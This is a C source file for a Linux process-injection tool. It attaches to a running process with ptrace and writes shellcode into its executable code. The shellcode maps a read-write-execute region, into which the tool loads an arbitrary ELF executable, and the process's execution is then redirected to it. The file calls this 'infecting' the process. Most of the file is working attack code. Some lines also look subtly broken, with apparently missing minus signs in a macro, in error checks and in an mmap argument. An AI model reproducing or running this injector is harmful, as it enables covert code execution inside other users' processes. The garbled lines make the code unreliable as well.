#include <unistd.h>
#include <stdlib.h>
#include <stdio.h>
#include <errno.h>
#include <elf.h>
#include <limits.h>
#include <string.h>
#include <fcntl.h>

#include <sys/ptrace.h>
#include <sys/types.h>
#include <sys/wait.h>
#include <sys/user.h>
#include <sys/stat.h>
#include <sys/mman.h>

#include <proc_maps.h>

#define PAGE_ALIGN(x) (x & ~(PAGE_SIZE 1))
#define PAGE_ALIGN_UP(x) (PAGE_ALIGN(x) + PAGE_SIZE)
#define WORD_ALIGN(x) ((x + 7) & ~7)
#define BASE_ADDRESS 0x00100000

typedef struct handle {
	Elf64_Ehdr* ehdr;
	Elf64_Phdr* phdr;
	Elf64_Shdr* shdr;
	uint8_t* mem;
	pid_t pid;
	uint8_t* shellcode;
	char* exec_path;
	uint64_t base;
	uint64_t stack;
	uint64_t entry;
	struct user_regs_struct pt_reg;
} handle_t;


static inline volatile void*
	evil_mmap(void *, uint64_t, uint64_t, uint64_t, int64_t, uint64_t)
	__attribute__((aligned(8),__always_inline__));
uint64_t injection_code(void *) __attribute__((aligned(8)));
uint64_t get_text_base(pid_t); 
int pid_write(int, void*, const void*, size_t);
int pid_read(int, void*, const void*, size_t);
uint8_t* create_fn_shellcode(void (*fn)(), size_t len);

void* f1 = injection_code;
void* f2 = get_text_base;

static inline volatile long evil_write(long fd, char *buf, unsigned long len) {
	long ret;
	__asm__ volatile(
		"mov %0, %%rdi\n"
		"mov %1, %%rsi\n"
		"mov %2, %%rdx\n"
		"mov $1, %%rax\n"
		"syscall" : : "g"(fd), "g"(buf), "g"(len));
	asm("mov %%rax, %0" : "=r"(ret));
	return ret;
}

static inline volatile int evil_fstat(long fd, struct stat *buf) {
	long ret;
	__asm__ volatile(
		"mov %0, %%rdi\n"
		"mov %1, %%rsi\n"
		"mov $5, %%rax\n"
		"syscall" : : "g"(fd), "g"(buf));
	asm("mov %%rax, %0" : "=r"(ret)); 
	return ret;
}

static inline volatile int evil_open(const char* path, unsigned long flags) {
	long ret;
	__asm__ volatile(
		"mov %0, %%rdi\n"
		"mov %1, %%rsi\n"
		"mov $2, %%rax\n"
		"syscall" : : "g"(path), "g"(flags));
	asm("mov %%rax, %0" : "=r"(ret)); 
	return ret;
}

static inline volatile void* evil_mmap(void* addr, uint64_t len, uint64_t prot, uint64_t flags, int64_t fd, uint64_t off) {
	long mmap_fd = fd;
	unsigned long mmap_off = off;
	unsigned long mmap_flags = flags;
	unsigned long ret;
	__asm__ volatile(
		"mov %0, %%rdi\n"
		"mov %1, %%rsi\n"
		"mov %2, %%rdx\n"
		"mov %3, %%r10\n"
		"mov %4, %%r8\n"
		"mov %5, %%r9\n"
		"mov $9, %%rax\n"
		"syscall\n" : : "g"(addr), "g"(len), "g"(prot), "g"(flags), "g"(mmap_fd), "g"(mmap_off));
	asm("mov %%rax, %0" : "=r"(ret)); 
	return (void *)ret;
}

int main(int argc, char** argv) {
	errno = 0;
	handle_t h;
	unsigned long shellcode_size = 132; /* TODO: Calculate it */
	int i, fd, status;
	uint8_t *executable, *origcode;
	struct stat st; 
	Elf64_Ehdr *ehdr;

	if (argc < 3) {
		printf("Usage: %s <pid> <injected_executable>\n", argv[0]);
		exit(EXIT_FAILURE);
	}
	h.pid = atoi(argv[1]);
	h.exec_path = strdup(argv[2]);

	if (ptrace(PTRACE_ATTACH, h.pid) < 0) {
		perror("PTRACE_ATTACH");
		exit(EXIT_FAILURE);
	}
	wait(NULL);
	h.base = get_text_base(h.pid);
	h.shellcode = create_fn_shellcode((void*)&injection_code, shellcode_size);

	printf(".text section for injection found: 0x%lx\n", h.base);
	/* Read original .text section */
	origcode = alloca(shellcode_size * sizeof(uint8_t*) + 8);
	if (pid_read(h.pid, (void*)origcode, (void*)h.base, shellcode_size) < 0) {
		exit(EXIT_FAILURE);
	}
	printf("Read original .text section\n");
	
	/* Write shellcode */
	if (pid_write(h.pid, (void*)h.base, (void*)h.shellcode, shellcode_size) < 0) {
		exit(EXIT_FAILURE);
	}
	printf("Write shellcode to process\n");

	/* Get current registers */
	if (ptrace(PTRACE_GETREGS, h.pid, NULL, &h.pt_reg) < 0) {
		perror("PTRACE_GETREGS");
		exit(EXIT_FAILURE);
	}

	/* reset execution from start */
	h.pt_reg.rip = h.base;
	h.pt_reg.rdi = BASE_ADDRESS;
	
	/* Set updated registers */
	if (ptrace(PTRACE_SETREGS, h.pid, NULL, &h.pt_reg) < 0) {
		perror("PTRACE_SETREGS");
		exit(EXIT_FAILURE);
	}
	printf("Update registers\n");

	/* Continue execution while int3 interuption in shellcode encounted */
	if (ptrace(PTRACE_CONT, h.pid, NULL, NULL) < 0) {
		perror("PTRACE_CONT");
		exit(EXIT_FAILURE);
	}
	printf("Continue execution while int3 register occured\n");

	/* Wait for interuption signal */
	wait(&status);
	if (WSTOPSIG(status) != SIGTRAP) {
		printf("Something went wrong, signal diffenciate from SIGTRAP was received\n");
		exit(EXIT_FAILURE);
	}
	printf("INT3 register successfully encounted, infecting executable...\n");

	/* Restore original section */
	if (pid_write(h.pid, (void*)h.base, (void*)origcode, shellcode_size) < 0) {
		exit(EXIT_FAILURE);
	}

	if ((fd = open(h.exec_path, O_RDONLY)) < 0) {
		perror("open");
		exit(EXIT_FAILURE);
	}
	if (fstat(fd, &st) < 0) {
		perror("fstat");
		exit(EXIT_FAILURE);
	}
	executable = malloc(WORD_ALIGN(st.st_size));
	if (read(fd, executable, st.st_size) < 0) {
		perror("read");
		exit(EXIT_FAILURE);
	}
	ehdr = (Elf64_Ehdr*)executable;
	h.entry = ehdr->e_entry;
	close(fd);
	if(pid_write(h.pid, (void*)BASE_ADDRESS, (void*)executable, st.st_size) < 0) {
		exit(EXIT_FAILURE);
	}
	
	if(ptrace(PTRACE_GETREGS, h.pid, NULL, &h.pt_reg) < 0) {
		perror("PTRACE_GETREGS");
		exit(EXIT_FAILURE);
	} 

	h.entry = BASE_ADDRESS + h.entry;
	h.pt_reg.rip = h.entry;
	if (ptrace(PTRACE_SETREGS, h.pid, NULL, &h.pt_reg) < 0) {
		perror("PTRACE_SETREGS");
		exit(EXIT_FAILURE);
	}
	
	if (ptrace(PTRACE_DETACH, h.pid, NULL, NULL) < 0) {
		perror("PTRACE_CONT");
		exit(EXIT_FAILURE);
	}
	wait(NULL);
	exit(EXIT_SUCCESS);
}

int pid_write(int pid, void* dst, const void* src, size_t len) {
	size_t quot = len / sizeof(void*);
	unsigned char *s = (unsigned char *)src;
	unsigned char *d = (unsigned char *)dst;
	while (quot != 0) {
		if (ptrace(PTRACE_POKETEXT, pid, d, *(void **)s) == 1) {
			goto fail;
		}
		s += sizeof(void*);
		d += sizeof(void*);
		quot--;
	}
	return 0;
fail:
	perror("PTRACE_PEEKTEXT");
	return 1;
}

int pid_read(int pid, void* dst, const void* src, size_t len) {
	int sz = len / sizeof(void *);
	unsigned char *s = (unsigned char*)src;
	unsigned char *d = (unsigned char*)dst;
	long word;
	while(sz != 0) {
		word = ptrace(PTRACE_PEEKTEXT, pid, s, NULL);
		if (word == 1 && errno) {
			fprintf(stderr, "pid_read failed pid: %d: %s\n", pid, strerror(errno));
			goto fail;
		}
		*(long *)d = word;
		s += sizeof(void *);
		d += sizeof(void *);
		sz--;
	}
	return 0;
fail:
	perror("PTRACE_PEEKTEXT");
	return -1;
}

uint64_t injection_code(void* vaddr) {
	volatile void* mem;
	mem = evil_mmap(vaddr, 8192, PROT_READ|PROT_WRITE|PROT_EXEC, MAP_PRIVATE|MAP_FIXED|MAP_ANONYMOUS, 1, 0);
	__asm__ __volatile__("int3"); /* Set breakpoint */
}

uint64_t get_text_base(pid_t pid) {
	uint64_t res;
	proc_maps_file_iterator_t* iter = create_proc_maps_file_iterator(pid);
	if (!iter) {
		fprintf(stderr, "Could not parse %d proc maps file", pid);
		return 1;
	}
	proc_maps_ent_t* ent;
	while ((ent = next_proc_maps(iter))) {
		if ((ent->properties & PROC_MAPS_READ) && 
			(ent->properties & PROC_MAPS_EXECUTE) &&
			(ent->properties & PROC_MAPS_PRIVATE)) {
			res = (uint64_t)ent->addr_start;
			delete_proc_maps_file_interator(iter);
			return res;
		}
	}
	delete_proc_maps_file_interator(iter);
	return 1;
}

/*
#define MAX_PATH 512

uint64_t get_text_base(pid_t pid) {
	char maps[MAX_PATH], line[256];
	char *start, *p;
	FILE *fd;
	int i;
	Elf64_Addr base;
	snprintf(maps, MAX_PATH, "/proc/%d/maps", pid);
	if ((fd = fopen(maps, "r")) == NULL) {
		fprintf(stderr, "Cannot open %s for reading: %s", maps, strerror(errno));
		return 1;
	}
	while (fgets(line, sizeof(line), fd)) {
		if (!strstr(line, "rxp")) {
			continue;
		}
		for (i = 0, start = alloca(32), p = line; *p != ' '; i++, p++) {
			start[i] = *p;
		}

		start[i] = '\0';
		base = strtoul(start, NULL, 16);
		break;
	}
	fclose(fd);
	return base;
}
*/

/* Transform function to memory shellcode */
uint8_t* create_fn_shellcode(void (*fn)(), size_t len) {
	size_t i; 
	uint8_t* shellcode = (uint8_t *)malloc(len);
	uint8_t* p = (uint8_t *)fn;
	for (i = 0; i < len; i++) {
		*(shellcode + i) = *p++; 
	}
	return shellcode;
}
